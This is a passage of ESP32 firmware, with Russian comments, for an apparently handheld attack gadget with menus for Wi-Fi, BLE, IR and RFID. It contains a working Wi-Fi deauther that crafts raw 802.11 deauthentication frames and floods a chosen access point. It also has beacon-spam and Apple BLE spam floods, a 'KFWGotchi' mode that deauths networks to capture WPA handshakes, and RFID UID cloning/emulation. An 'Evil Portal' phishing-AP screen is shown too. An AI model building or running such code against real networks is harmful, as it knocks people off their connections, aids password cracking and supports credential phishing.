              WiFi.mode(WIFI_STA);
              delay(100);
              esp_wifi_start();
              currentState = BEACON_COUNT_SEL; 
            }
            else if(menuIndex == 1) { 
              if(LittleFS.exists("/ssids.txt")) currentState = BEACON_RUN; 
              else { currentState = WIFI_ATTACKS; } 
            }
            else currentState = WIFI_ATTACKS;
            menuIndex = 0; 
            break;

          case BEACON_COUNT_SEL: {
            pktCount = 0;
  
            // Жёсткий сброс
            esp_wifi_stop();
            delay(100);
            esp_wifi_deinit();
            delay(100);
  
            wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
            esp_wifi_init(&cfg);
            esp_wifi_set_mode(WIFI_MODE_STA);
            esp_wifi_start();
            delay(200);
  
            Serial.println("WiFi initialized for Beacon Spam");
  
            currentState = BEACON_RUN; }
          break;

          case BLE_MENU:
            if(menuIndex < 3) { selectedAppleType = menuIndex; startAppleJuice(selectedAppleType); currentState = BLE_RUN; }
            else currentState = MAIN_MENU;
            menuIndex = 0; 
          break;

          case WIFI_SCAN_LIST: {
            if (foundDevices > 0) {
              if (scrollIndex < foundDevices) {
                // ВЫБРАЛИ СЕТЬ: сохраняем данные и идем на инфо-экран
                target_ch = WiFi.channel(scrollIndex);
                memcpy(target_mac, WiFi.BSSID(scrollIndex), 6);
                target_ssid = WiFi.SSID(scrollIndex); // Добавь глобальную переменную String target_ssid
                target_rssi = WiFi.RSSI(scrollIndex); // Добавь глобальную переменную int target_rssi
            
                currentState = WIFI_INFO_SCREEN; // Меняем стейт (добавь его в enum)
                menuIndex = 0; // Сброс для нового меню (Attack/Back)
              } else {
              // ВЫБРАЛИ BACK: возвращаемся в меню вайфая
              currentState = WIFI_MENU;
              scrollIndex = 1; // Чтобы курсор стоял на "Scan"
              }
            } else {
            currentState = WIFI_MENU;
            }
          } break;
        }
      }
    }
  }

  // --- ОТРИСОВКА (Rendering) ---
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);

  switch(currentState) {
    case MAIN_MENU: {
#if !defined(CHIP_ESP32C3)
      const char* m[] = {"Wi-Fi", "BLE", "IR", "RFID", "Files", "Info", "Settings"};
      const uint8_t* ico[] = {ico_wifi, ico_ble, ico_ir, ico_rfid, ico_files, ico_info, ico_settings};
      renderMenu("Main Menu", m, ico, 7, menuIndex);
#else
      const char* m[] = {"Wi-Fi", "BLE", "IR", "Files", "Info", "Settings"};
      const uint8_t* ico[] = {ico_wifi, ico_ble, ico_ir, ico_files, ico_info, ico_settings};
      renderMenu("Main Menu", m, ico, 6, menuIndex);
#endif
    } break;


#if !defined(CHIP_ESP32C3)
    case FORMAT_CARD: {
      drawHeader("RFID");
      display.setCursor(0, 20);
      display.println("Hold card tight...");

      if (rfid.PICC_IsNewCardPresent() && rfid.PICC_ReadCardSerial()) {
        display.setCursor(0, 35);
        display.println("Formatting...");
        display.display();

        fullFormatCard();

        display.setCursor(0, 35);
        display.println("Done!");
        display.display();
        delay(2000);
        currentState = RFID_MENU;
        menuIndex = 0;
      } else {
        display.setCursor(0, 35);
        display.println("Waiting for card...");
      }
    } break;

    case RFID_DUMP_PROCESS: {
    drawHeader("Dumping data...");
    display.setCursor(0, 20);
    display.println("Hold the card steady.");

    if (rfid.PICC_IsNewCardPresent() && rfid.PICC_ReadCardSerial()) {
        // Получаем UID для имени
        lastUid = "";
        for (byte i = 0; i < rfid.uid.size; i++) {
            lastUid += String(rfid.uid.uidByte[i] < 0x10 ? "0" : "");
            lastUid += String(rfid.uid.uidByte[i], HEX);
        }

        performFullDump(); // Запускаем наш тяжелый процесс

        display.fillRect(0, 30, 128, 34, BLACK);
        display.setCursor(0, 40);
        display.println("Done! Saved as:");
        display.print("dump_" + String(getNextDumpNumber() - 1));
        display.display();

        rfid.PICC_HaltA();
        rfid.PCD_StopCrypto1();
        delay(2000);
        currentState = RFID_MENU;
      }
    } break;

    case RFID_MENU: {
      drawHeader("RFID");
      // Обновленный список из 5 пунктов
      const char* rItems[] = {
        "Read",
        "Dump",
        "Format",
        "Emulate",
        "Main Menu"
      };
      renderMenu("RFID", rItems, nullptr, 5, menuIndex);
    } break;

    case RFID_EMULATION: {
      drawHeader("Emulating...");
      display.setCursor(0, 20);
      display.print("UID: "); display.println(lastUid != "" ? lastUid : "DEADBEEF");
      display.setCursor(0, 40);
      display.println("Mode: Active");
      display.setCursor(0, 55);
      display.print("[OK] Back");

      byte emuUid[4] = {0xDE, 0xAD, 0xBE, 0xEF};
      if (lastUid.length() >= 8) {
          for (int i = 0; i < 4; i++) {
            emuUid[i] = strtol(lastUid.substring(i * 2, i * 2 + 2).c_str(), NULL, 16);
          }
      }

      rfid.PCD_WriteRegister(rfid.CommandReg, 0x00);
      rfid.PCD_WriteRegister(rfid.FIFOLevelReg, 0x80);
      for (int i = 0; i < 4; i++) {
        rfid.PCD_WriteRegister(rfid.FIFODataReg, emuUid[i]);
      }
      rfid.PCD_WriteRegister(rfid.CommandReg, 0x03);
    } break;

    case RFID_RECV: {
      drawHeader("Scanning...");
      display.setCursor(0, 20);
      display.println("Approach the tag...");

      // Вызываем чтение
      if (rfid.PICC_IsNewCardPresent() && rfid.PICC_ReadCardSerial()) {
        lastUid = "";
        for (byte i = 0; i < rfid.uid.size; i++) {
            lastUid += String(rfid.uid.uidByte[i] < 0x10 ? "0" : "");
            lastUid += String(rfid.uid.uidByte[i], HEX);
        }
        lastUid.toUpperCase();
        rfid.PICC_HaltA();
      }

      if (lastUid != "") {
        display.fillRect(0, 32, 128, 20, WHITE);
        display.setTextColor(BLACK);
        display.setCursor(5, 38);
        display.print("UID: ");
        display.println(lastUid);
        display.setTextColor(WHITE);
        display.setCursor(0, 55);
        display.print("[OK] to Back");
      } else {
        display.setCursor(0, 55);
        display.print("[OK] to Cancel");
      }
    } break;
#endif

    case WIFI_MENU: {
      const char* m[] = {"Start AP", "Scan", "Attacks", "Sniffers", "Graph", "KFWGotchi", "Evil Portal", "Back"};
      renderMenu("Wi-Fi", m, nullptr, 8, menuIndex);
      } break;
    
    case WIFI_ATTACKS: {
      const char* m[] = {"Deauther", "Beacon Spam", "Back"};
      renderMenu("Wi-Fi Attacks", m, nullptr, 3, menuIndex);
      } break;
    case BEACON_SOURCE: { const char* m[] = {"Default", "Custom File", "Main Menu"}; renderMenu("Beacon Source", m, nullptr, 3, menuIndex); } break;
    case FILES_MENU: { const char* m[] = {"LittleFS", "Main Menu"}; renderMenu("Files", m, nullptr, 2, menuIndex); } break;
    case BLE_MENU: {
      const char* m[] = {"Apple AirPods", "Apple TV", "Apple Keyboard", "Back"};
      renderMenu("AppleJuice", m, nullptr, 4, menuIndex);
      } break;

    case BEACON_COUNT_SEL:
      drawHeader("SSID Count");
      display.setTextSize(2); display.setCursor(45, 30); display.print(beaconCount);
      display.setTextSize(1); display.setCursor(10, 55); display.print("[N] +5  [OK] START");
      break;

    case BEACON_SNIFFER: {
      String info1 = "Last: " + lastBeaconSSID.substring(0, 16);
      String info2 = "Total: " + String(beaconsFound);
      drawActiveScreen("Beacon Sniffer", "Monitoring...", info1.c_str(), info2.c_str(), "[OK] Stop");
  
      static unsigned long lastH = 0;
      if(millis() - lastH > 300) {
        static int ch = 1;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        ch = (ch % 13) + 1;
        lastH = millis();
      }
    } break;

    case SETTINGS_SCREEN: {
      display.clearDisplay();
  
      // Заголовок
      display.fillRect(0, 0, 128, 12, WHITE);
      display.setTextColor(BLACK);
      display.setTextSize(1);
      display.setCursor(4, 2);
      display.print("Settings");
      display.setTextColor(WHITE);

      // Пункты
      const char* labels[] = {"Wi-Fi Power", "BLE Power", "Brightness", "Back"};
      String values[] = {
        String(wifiPowerNames[wifiPowerIdx]),
        "Lvl " + String(blePowerIdx),
        String(brightNames[brightIdx]),
        ""
      };

      int maxVisible = 3;
      int startIdx = 0;
      if (menuIndex >= maxVisible) startIdx = menuIndex - maxVisible + 1;

      for (int i = 0; i < maxVisible; i++) {
        int idx = startIdx + i;
        if (idx >= 4) break;

        int yPos = 13 + (i * 13);
        bool isSelected = (idx == menuIndex);

        if (isSelected) {
          display.fillRect(0, yPos, 128, 13, WHITE);
          display.setTextColor(BLACK);
        } else {
          display.setTextColor(WHITE);
        }

        display.setCursor(4, yPos + 2);
        display.print(labels[idx]);

        // Значение справа
        if (values[idx] != "") {
          display.setCursor(85, yPos + 2);
          display.print(values[idx]);
        }
    
        if (isSelected) {
          display.setCursor(118, yPos + 2);
          display.print(">");
        }
      }

      // Статусбар
      display.drawLine(0, 54, 128, 54, WHITE);
      display.setCursor(0, 56);
      display.print("[N]Change");
      display.setCursor(75, 56);
      display.print("[OK]Back");
    } break;
 
    case IR_MENU: {
      const char* m[] = {"Receiver", "Send Last", "TV-B-Gone", "Back"};
      renderMenu("IR", m, nullptr, 4, menuIndex);
      } break;

    case IR_RECV: {
      int rawState = digitalRead(kRecvPin);
      String status = "Pin 15: " + String(rawState);
  
      if (irrecv.decode(&results)) {
        lastIrCode = results.value;
        lastIrProtocol = results.decode_type;
        irrecv.resume();
      }

      String info1 = "";
      String info2 = "";
      if (lastIrCode != 0) {
        info1 = "Code: " + String((uint32_t)lastIrCode, HEX);
        info2 = "Proto: " + String((int)lastIrProtocol);
      }
  
      drawActiveScreen("IR Receiver", status.c_str(), 
                      info1 != "" ? info1.c_str() : nullptr, 
                      info2 != "" ? info2.c_str() : nullptr, 
                      "[OK] Stop");
    } break;

    case BEACON_RUN: {
      String status = "CH: " + String(currentCh) + " | Sent: " + String(pktCount);
      drawActiveScreen("Beacon Spam", status.c_str(), nullptr, nullptr, "[OK] Stop");

      static unsigned long lastB = 0;
      static int currentCh = 1;

      if (millis() - lastB > 100) { 
        lastB = millis();
    
        // Переключаем канал
        currentCh++;
        if (currentCh > 13) currentCh = 1;
        esp_wifi_set_channel(currentCh, WIFI_SECOND_CHAN_NONE);

        // Отправляем пачку рандомных сетей
        for (int i = 0; i < beaconCount; i++) {
          String ssid = "KFW_" + String(random(1000, 9999));
          sendBeacon(ssid);
          pktCount++;
        }
      }
    } break;

    case SNIFFERS_MENU: {
      const char* m[] = {"Probe Sniffer", "Beacon Sniffer", "Graph", "Back"};
      renderMenu("Sniffers", m, nullptr, 4, menuIndex);
      } break;

    case PROBE_SNIFFER: {
      String info1 = "Last: " + lastProbeSSID.substring(0, 16);
      String info2 = "Total: " + String(probesCount);
      drawActiveScreen("Probe Sniffer", "Monitoring...", info1.c_str(), info2.c_str(), "[OK] Stop");
  
      static unsigned long nextCh = 0;
      if(millis() > nextCh) {
        static int ch = 1;
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        ch++; if(ch > 13) ch = 1;
        nextCh = millis() + 300;
      }
    } break;

    case CH_GRAPH:
      drawChannelGraph();
      break;

    case FILE_OPTIONS: {
      const char* m[] = {"View Content", "Delete File", "Back"};
      renderMenu(selectedFile.c_str(), m, nullptr, 3, menuIndex);
    } break;

    case FILE_CONTENT: {
      drawHeader("View: " + selectedFile);
      if (selectedFile.endsWith(".jpg") || selectedFile.endsWith(".jpeg")) {
        // Указываем библиотеке, что использовать LittleFS
        // Это важно сделать один раз в setup или прямо здесь
        TJpgDec.setCallback(tjpg_output);
        
        // Передаем путь строкой. Библиотека сама откроет файл через LittleFS
        // Важно: путь должен начинаться со слеша
        String fullPath = "/" + selectedFile;
        TJpgDec.drawJpg(0, 12, fullPath); 
        
      } else {
        // Просмотр текстовых файлов (оставляем как было)
        File f = LittleFS.open("/" + selectedFile, "r");
        if(f) {
           display.setCursor(0, 15);
           // Читаем несколько строк, чтобы экран не был пустым
           int y = 15;
           while(f.available() && y < 55) {
             display.setCursor(0, y);
             display.print(f.readStringUntil('\n').substring(0, 21));
             y += 10;
           }
           f.close();
        }
      }
      display.setCursor(0, 56);
      display.print("[OK] Back");
    } break;

    case WIFI_SCAN_LIST: {
    drawHeader("Wi-Fi Scan");
    if (foundDevices == 0) {
        display.setCursor(5, 30);
        display.print("No networks...");
    } else {
        int totalItems = foundDevices + 1; // Сети + пункт BACK
        int startIdx = (scrollIndex / 4) * 4; 
        int relativePos = scrollIndex % 4;
        
        float targetY = 18.0 + (relativePos * 10.0);
        
        // Магия плавности
        if (abs(targetY - smoothY) > 40) smoothY = targetY; // Телепорт при прыжке
        smoothY += (targetY - smoothY) * 0.22;
        if (abs(targetY - smoothY) < 0.1) smoothY = targetY;

        display.fillRect(0, (int)smoothY - 1, 128, 10, WHITE);

        for (int i = 0; i < 4; i++) {
            int idx = (scrollIndex / 4 * 4) + i;
            if (idx >= totalItems) break;

            int yPos = 18 + (i * 10);
            
            if (abs(yPos - (int)smoothY) < 5) display.setTextColor(BLACK);
            else display.setTextColor(WHITE);

            display.setCursor(2, yPos);
            
            if (idx < foundDevices) {
                // Если это сеть
                String ssid = WiFi.SSID(idx);
                if(ssid.length() > 14) ssid = ssid.substring(0, 13) + "..";
                display.print(ssid);
                display.setCursor(105, yPos);
                display.print(abs(WiFi.RSSI(idx)));
            } else {
                // Если это последний пункт
                display.print("Main Menu");
            }
          }
        }
    } break;

    case DEAUTH_RUN: {
      String mac = "";
      for(int i=0; i<6; i++) {
        mac += String(target_mac[i], HEX);
        if(i<5) mac += ":";
      }
      String info1 = "MAC: " + mac;
      String info2 = "CH:" + String(target_ch) + " PKT:" + String(pktCount);
      drawActiveScreen("Deauther", "Attacking...", info1.c_str(), info2.c_str(), "[OK] Stop");

      uint8_t deauthPkt[26] = {
        0xC0, 0x00, 0x3A, 0x01, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x07, 0x00 
      };
      memcpy(&deauthPkt[10], target_mac, 6);
      memcpy(&deauthPkt[16], target_mac, 6);
      esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
  
      for(int i = 0; i < 100; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauthPkt, sizeof(deauthPkt), false);
        pktCount++;
      }
    } break;
    

    case LITTLEFS_LIST: {
      display.clearDisplay();
  
      // Заголовок
      display.fillRect(0, 0, 128, 12, WHITE);
      display.setTextColor(BLACK);
      display.setCursor(4, 2);
      display.print("LittleFS");
      display.setTextColor(WHITE);

      int totalItems = (cachedFileCount == 0) ? 1 : cachedFileCount + 1;
      int maxVisible = 3;
      int startIdx = 0;
      if (scrollIndex >= maxVisible) startIdx = scrollIndex - maxVisible + 1;

      for (int i = 0; i < maxVisible; i++) {
        int idx = startIdx + i;
        if (idx >= totalItems) break;

        int yPos = 13 + (i * 13);
        bool isSelected = (idx == scrollIndex);

        if (isSelected) {
          display.fillRect(0, yPos, 128, 13, WHITE);
          display.setTextColor(BLACK);
        } else {
          display.setTextColor(WHITE);
        }

        display.setCursor(4, yPos + 2);
    
        if (cachedFileCount == 0) {
          display.print("No files. OK=Scan");
        } else if (idx < cachedFileCount) {
          String name = fileList[idx];
          if (name.length() > 18) name = name.substring(0, 17) + "..";
          display.print(name);
        } else {
          display.print("<< BACK");
        }

        if (isSelected) {
          display.setCursor(118, yPos + 2);
          display.print(">");
        }
      }

      // Статусбар
      display.drawLine(0, 54, 128, 54, WHITE);
      display.setCursor(0, 56);
      display.print("[N]Next");
      display.setCursor(80, 56);
      display.print("[OK]Select");
    } break;

    case WIFI_INFO_SCREEN: {
      drawHeader("Wi-Fi Info");
    
      display.setCursor(0, 18);
      display.printf("SSID: %s", target_ssid.c_str());
      display.setCursor(0, 28);
      display.print("MAC: ");
      for(int i=0; i<6; i++) {
        display.print(target_mac[i], HEX);
        if(i<5) display.print(":");
      }
      display.setCursor(0, 38);
      display.printf("CH: %d  |  RSSI: %d", target_ch, target_rssi);

      // Рисуем кнопки выбора снизу
      int targetY = 50;
      float smoothX = 0 + (menuIndex * 64); // Плавная рамка по горизонтали (по желанию)
    
      display.fillRect((int)smoothX, 48, 64, 16, WHITE);
    
      display.setTextColor(menuIndex == 0 ? BLACK : WHITE);
      display.setCursor(5, 53); display.print(" Attack ");
    
      display.setTextColor(menuIndex == 1 ? BLACK : WHITE);
      display.setCursor(75, 53); display.print(" Cancel ");
    } break;

    case PWN_MODE: {
      if (kfw_pwn.menu_active) {
        // --- МЕНЮ ПАУЗЫ ---
        const char* m[] = {"Resume", kfw_pwn.deauth_enabled ? "Deauth: ON" : "Deauth: OFF", "Exit"};
        renderMenu("KFWGotchi", m, nullptr, 3, menuIndex);
    
        // Уже обрабатывается в if(ok) выше
      } else {
        // --- АКТИВНЫЙ РЕЖИМ ---
    
        // Таймеры
        static unsigned long pwnTimer = 0;
        static unsigned long happyTimer = 0;
    
        if (kfw_pwn.got_eapol) { 
          happyTimer = millis() + 5000; 
          kfw_pwn.got_eapol = false; 
        }

        // Логика состояний
        if (currentPwnStep == STEP_SCANNING && kfw_pwn.target_found) {
          currentPwnStep = STEP_LOCKED;
          pwnTimer = millis() + 15000;
        } else if (currentPwnStep == STEP_LOCKED && millis() > pwnTimer) {
          currentPwnStep = STEP_RELAX;
          pwnTimer = millis() + 2000;
        } else if (currentPwnStep == STEP_RELAX && millis() > pwnTimer) {
          currentPwnStep = STEP_SCANNING;
          kfw_pwn.target_found = false;
        }

        // Выбор лица
        int faceIdx = 0;
        if (millis() < happyTimer) faceIdx = 4; // Радость (HS)
        else if (currentPwnStep == STEP_LOCKED) {
          if(kfw_pwn.deauth_enabled) faceIdx = 3; // Злой (атакует)
          else faceIdx = 2; // Нашёл но не атакует
        }
        else if (kfw_pwn.target_found) faceIdx = 8; // Взволнован
        else if (kfw_pwn.current_rssi < -80) faceIdx = 6; // Грустит (слабый сигнал)
        else if (kfw_pwn.current_rssi > -40) faceIdx = 11; // Шокирован (сильный)
        else if ((millis() / 2000) % 10 == 0) faceIdx = 1; // Моргает/спит
        else faceIdx = 7; // Сканирует

        // Отрисовка
        display.clearDisplay();
        display.fillRect(0, 0, 128, 12, WHITE);
        display.setTextColor(BLACK);
        display.setCursor(4, 2);
        display.print("KFWGotchi");
    
        display.setTextSize(2);
        display.setTextColor(WHITE);
        display.setCursor(20, 24);
        display.print(faces[faceIdx]);
    
        display.setTextSize(1);
        display.setCursor(2, 14);
        display.print("CH:"); display.print(kfw_pwn.current_ch);
        display.setCursor(45, 14);
        display.print("RSSI:"); display.print(kfw_pwn.current_rssi);
        display.setCursor(95, 14);
        display.print("HS:"); display.print(pktCount);

        display.drawLine(0, 44, 128, 44, WHITE);
        display.setCursor(2, 47);
    
        if (currentPwnStep == STEP_SCANNING) {
          display.print("Scanning...");
          static unsigned long hopT = 0;
          if(millis() - hopT > 300) {
            kfw_pwn.current_ch = (kfw_pwn.current_ch % 13) + 1;
            esp_wifi_set_channel(kfw_pwn.current_ch, WIFI_SECOND_CHAN_NONE);
            hopT = millis();
          }
        } else {
          display.print("Pwn: "); 
          display.print(kfw_pwn.last_ssid.substring(0, 10));
          if (kfw_pwn.deauth_enabled) sendDeauth(kfw_pwn.target_bssid);
        }

        // Статусбар
        display.drawLine(0, 54, 128, 54, WHITE);
        display.setCursor(0, 56);
        display.print("[N]CH+");
        display.setCursor(80, 56);
        display.print("[OK]Menu");
      }
    } break;

    case SYSTEM_INFO:
        drawHeader("Info");
        display.setCursor(5, 22); display.printf("RAM: %d KB", ESP.getFreeHeap()/1024);
        display.setCursor(5, 35); display.print("Version: V1 Stable");
        display.fillRect(0, 52, 128, 12, WHITE);
        display.setTextColor(BLACK); display.setCursor(40, 54); display.print("Back");
        break;

    case WEBUI_ACTIVE:
      drawHeader("WebUI");
      display.setCursor(5,25); display.print("Connecting...");
      display.setCursor(5,35); display.printf("IP: %s", WiFi.localIP().toString().c_str());
      break;

    case BLE_RUN: {
      String dots = "";
      for(int i=0; i<(millis()/300)%4; i++) dots += ".";
      String status = "Spamming" + dots;
      String info = "Packets: ~" + String(millis()/100);
      drawActiveScreen("AppleJuice", status.c_str(), info.c_str(), nullptr, "[OK] Stop");
    } break;

    case EVIL_PORTAL: {
      String apIP = WiFi.softAPIP().toString();
      String info1 = "IP: " + apIP;
      String info2 = "Clients: " + String(WiFi.softAPgetStationNum());
      drawActiveScreen("Evil Portal", "Running...", info1.c_str(), info2.c_str(), "[OK] Stop");
    } break;
  }

  display.display();
}


